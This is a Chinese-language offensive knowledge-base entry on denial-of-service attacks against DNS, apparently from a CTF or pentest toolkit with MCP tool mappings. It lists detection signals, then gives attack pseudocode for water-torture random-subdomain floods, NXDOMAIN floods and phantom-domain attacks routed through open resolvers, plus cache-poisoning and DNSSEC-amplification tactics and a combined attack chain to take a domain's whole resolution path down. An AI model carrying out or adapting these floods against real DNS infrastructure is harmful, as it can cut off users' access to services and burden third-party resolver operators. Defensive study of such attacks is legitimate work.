# DNS 拒绝服务攻击

## 场景

DNS 是互联网基础设施中最脆弱的单点之一。攻击者利用 DNS 协议特性，攻击目标域名的权威 DNS、递归解析器或特定解析路径。不同于 DNS 放大攻击 (以 DNS 为武器攻击第三方)，这里 DNS 本身是目标。

```
攻击目标类型:
  - 权威 DNS 服务器: 无法解析目标域 → 网站"消失"
  - 递归解析器: 用户无法上网 → ISP 级影响
  - DNS 缓存: 注入 poison 记录 → 重定向流量
  - DNS-over-HTTPS (DoH): 新攻击面
```

## 输入信号

- 权威 DNS 查询 QPS 异常升高，所有查询为随机子域 (水刑攻击特征: 无重复子域)
- 递归解析器 `cache miss rate` 接近 100%，`cache hit rate` 接近 0% (正常 > 80%)
- 权威 DNS `NXDOMAIN` 响应占比异常 (> 90%)，且每个 NXDOMAIN 子域完全不同
- 递归器 outgoing 查询中 `TASK TIMED OUT` 或 `SERVFAIL` 占比异常 (Phantom domain)
- 递归解析器响应延迟 P99 > 3s (正常 < 200ms)，QPS 无明显增加但延迟飙升
- DNS 查询类型 `ANY` / `TXT` 请求占比明显偏高 (正常以 A/AAAA 为主)
- 缓存中突然出现不匹配的 A/NS 记录 (cache poisoning 迹象)
- 同一个目标域的子域 entropy 异常高 (每个子域 8+ 随机字符)，说明自动化生成

---

## 方法 1: Water Torture (水刑攻击)

### 原理

向权威 DNS 发送大量**随机子域名**的查询，每个子域都独一无二。由于递归解析器没有缓存命中，每个查询都必须转发到权威 DNS。

```
攻击:
  abc123.target.com  A?  → 递归器 → 权威 (cache miss → 查询上游)
  def456.target.com  A?  → 递归器 → 权威 (cache miss → 查询上游)
  ...
  rAnDoM.target.com  A?  → 递归器 → 权威 (cache miss → 查询上游)

效果:
  - 递归器无缓存命中 → 每个查询"穿透"到权威
  - 权威服务器 CPU/带宽被耗尽
  - 递归器也消耗大量 outgoing 连接
  
放大: 
  1 个攻击请求 → 递归器可能发起多个查询 (A + AAAA + NS + ...)
  每个查询可能重试多次
```

### 伪随机子域生成

```
function water_torture(domain, qps=50000, duration_sec=300):
    """
    水刑攻击: 生成永不重复的随机子域查询
    
    DNS 递归器缓存特性:
      - 命中过的子域不再查询权威
      - 所以必须每次生成全新子域
      - 随机字符串 + 时间戳保证唯一性
    """
    
    open_resolvers = load_resolver_list()  # 开放递归解析器列表
    
    deadline = now() + duration_sec
    counter = 0
    
    while now() < deadline:
        # 每个批次使用不同递归器
        resolver = open_resolvers[counter % len(open_resolvers)]
        
        # 生成唯一子域
        subdomain = random_alphanumeric(8, 16) + hex(counter) + "." + domain
        
        # 构造 DNS 查询
        query = build_dns_query(
            name=subdomain,
            qtype=random_choice(["A", "AAAA", "MX", "ANY"]),
            rd=1,  # recursion desired
            dnssec_ok=False
        )
        
        udp_send(resolver, 53, query)
        counter += 1
        
        # 速率控制
        if counter % 10000 == 0:
            rate = counter / (now() - (deadline - duration_sec))
            print("[*] {counter} unique subdomains, {rate:.0f} qps")
            sleep(0.1)  # 微调速率
```

### 反水刑: 不同查询类型

```
# 不仅随机子域，还变化查询类型和源端口
# 进一步降低递归器层面的聚合/缓存效率

for each query:
    subdomain = random() + "." + domain
    qtype = random_choice([
        "A", "AAAA", "MX", "TXT", "CNAME", 
        "NS", "SOA", "ANY", "CAA", "SRV"
    ])
    # 某些类型允许更大响应 (ANY, TXT) → 增加权威负载
```

## 方法 2: NXDOMAIN Flood

### 原理

查询肯定不存在的域名，使递归器向权威发送大量"domain not found"查询。与 Water Torture 类似但更隐蔽：源 IP 分散且查询看似合法。

```
攻击:
  definitely-not-exist-001.target.com A?
  definitely-not-exist-002.target.com A?
  ...

特点:
  - 权威 DNS 必须处理每个查询 (在 zone 中查找 → NXDOMAIN)
  - 递归器也不能缓存 NXDOMAIN 太久 (TTL SOA min 通常 60-300s)
  - NXDOMAIN 响应通常比正常 A 记录大 → 消耗更多权威上行带宽
```

### 伪代码

```
function nxdomain_flood(target_domain, qps=30000, duration_sec=600):
    """
    NXDOMAIN flood — 大量查询不存在的子域
    
    防御难点:
      - 无恶意 payload，全是合法 DNS 查询
      - 源 IP 来自合法递归器 (而非攻击者直接发包)
      - 每个子域不同 → rate limit 按子域分别计数无效
    """
    
    resolvers = load_open_resolvers()
    base_sub = random_alphanumeric(4, 6)
    
    deadline = now() + duration_sec
    n = 0
    
    while now() < deadline:
        resolver = resolvers[n % len(resolvers)]
        nx_sub = f"{base_sub}{n:x}.{target_domain}"
        
        query = build_dns_query(nx_sub, qtype="A", recursion_desired=True)
        udp_send(resolver, 53, query)
        
        n += 1
        
        if n % 50000 == 0:
            print(f"[*] {n} NXDOMAIN queries sent via {len(resolvers)} resolvers")
```

## 方法 3: Phantom Domain Attack

### 原理

让递归器的 outgoing 解析进入"幽灵"状态。攻击者控制的权威 DNS 收到查询后，不回复任何内容（静默丢弃）：

```
攻击流程:
  1. 攻击者注册 phantom-attack.com
  2. 配置权威 DNS: 收到查询后不回复 (静默丢弃)
  3. 向大量递归器发送 random.phantom-attack.com 查询
  4. 递归器向权威查询 → 无响应 → 重试
  5. 递归器资源被"幽灵"查询占用 → 合法查询超时

一个查询可卡住递归器数秒到数十秒 (UDP timeout + 重试)
```

### 关键参数

```
递归器重试行为:
  UDP 超时: 2-5 秒 (每次)
  重试次数: 2-3 次
  TCP fallback: 截断后转 TCP (60 秒超时)
  总耗时: 每个查询可卡住 10-60 秒

攻击者:
  每秒发 1000 个 phantom 查询
  每个查询平均卡住 20 秒
  稳态: 20000 个并发查询在递归器上等待
  递归器 outgoing socket 池被占满 → 合法查询失败
```

### 伪代码

```
# 攻击者预配置:
# 拥有 phantom.example.com 的权威 DNS 控制权
# 权威 DNS 配置为静默丢弃所有查询

function phantom_domain_attack(phantom_zone, resolvers, 
                                subdomain_rate=2000, duration=600):
    """
    利用静默权威 DNS 卡住递归器
    
    phantom_zone: 攻击者控制的域名 (其权威 DNS 不回复)
    """
    
    deadline = now() + duration
    sent = 0
    
    while now() < deadline:
        resolver = resolvers[sent % len(resolvers)]
        
        # 唯一子域确保无缓存命中
        sub = f"phantom{sent:x}.{phantom_zone}"
        
        # 发送正常查询 (TYPE ANY 增加权威必须处理的数据)
        query = build_dns_query(sub, qtype="ANY", rd=1)
        udp_send(resolver, 53, query)
        
        sent += 1
        
        # 速率控制 — 不需要太高 (每个查询可卡住数十秒)
        if sent % (subdomain_rate / 10) == 0:
            sleep(0.1)
    
    # 效果评估:
    # 攻击停止后递归器需要~60s 恢复 (outgoing 超时 + 重试全部结束)
```

## 方法 4: DNS Cache Poisoning 用于 DoS

### 原理

注入恶意缓存记录使域名解析到错误 IP 或不可达地址：

```
攻击向量 (传统):
  - 生日攻击 (CVE-2008-1447 / Kaminsky): 猜测 TXID + 源端口
  - DNS 响应伪造 (需要 on-path 或 UDP 碎片)

现代向量:
  - 公共递归器缓存污染: 诱使公共 DNS (8.8.8.8) 缓存错误记录
  - TLD/ccTLD 层面 route hijack → 重定向权威查询
  - DNSSEC 绕过: 降级攻击或算法错误
```

### 利用 Cache 做 DoS

```
场景1: 将 www.victim.com 解析到 0.0.0.0
  → 所有用户无法访问

场景2: 将 www.victim.com 解析到攻击者控制的服务器
  → 流量劫持 → 攻击者服务器回复极慢 → 客户端超时
  → 效果: 看起来像服务宕机

场景3: 注入巨大 DNS 记录使解析器 OOM
  TXT 记录可包含任意长文本
  注入 1000+ 条 TXT 记录 → 单次查询回复数 KB
```

## 方法 5: DNSSEC 放大 (以 DoS 为目标)

```
传统 DNS 放大: 攻击第三方
DNSSEC DoS:    攻击 DNS 服务器本身

原理:
  DNSSEC 签名记录 (RRSIG, DNSKEY) 体积巨大
  向启用 DNSSEC 的权威发 ANY 查询
  响应包含: A + AAAA + RRSIG × N + NSEC/NSEC3 + DNSKEY
  
  查询: 约 60 bytes
  响应: 约 2500-5000 bytes
  放大: ~40-80x

  如果攻击者以 DNS 服务器本身为目标:
    不需要伪造源 IP (直接发送)
    每个小查询消耗权威大量带宽
    200 Mbps 查询 → 权威 8-16 Gbps 出口 → 带宽账单爆炸
```

## 攻击链

```
对权威 DNS:
  1. 扫描确认目标域的权威 DNS 服务器地址
  2. Water Torture (随机子域) → 打满查询处理能力
  3. 配合 ANY + DNSSEC 查询 → 增加响应体积消耗带宽
  4. 如果部署 Anycast → 需同时攻击所有 PoP

对递归器:
  1. Phantom domain 耗尽 outgoing 连接池
  2. NXDOMAIN flood 打满 CPU
  3. 注入 poisoned cache → 长期影响

混合:
  同时攻击递归器和权威 → 整个 DNS 解析路径瘫痪
```

## 参考资料

1. CVE-2008-1447 — Kaminsky DNS cache poisoning (TXID birthday attack)
2. "DNS Water Torture Attack" — Akamai Threat Advisory, 2014
3. "Phantom Domain Attack: A New DNS DoS Vector" — Jian Jiang et al., NDSS 2012
4. RFC 7871 — EDNS0 Client Subnet (can be abused for cache bypass)
5. CVE-2021-25214 — BIND DNS zone transfer DoS
6. "NXDOMAIN: The black hole that swallows DNS" — US-CERT TA14-212A
7. DNS Flag Day 2020 — EDNS0 enforcement and impact on amplification
8. "Spamhaus DDoS 2013" — 300 Gbps DNS reflection attack analysis
9. openresolverproject.org — Open DNS resolver scanning
10. RFC 4033/4034/4035 — DNSSEC (amplification vector analysis)

## MCP 工具映射

| 步骤 | 工具 | 说明 |
|------|------|------|
| DNS 配置探测 | `http_probe` | 探测权威 DNS 是否启用 DNSSEC |
| 技术搜索 | `kb_router` | 搜索 dns_dos / water_torture / phantom |
| 技术查阅 | `kb_read_file` | 读取本文件及 03-amplification-drdos |

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
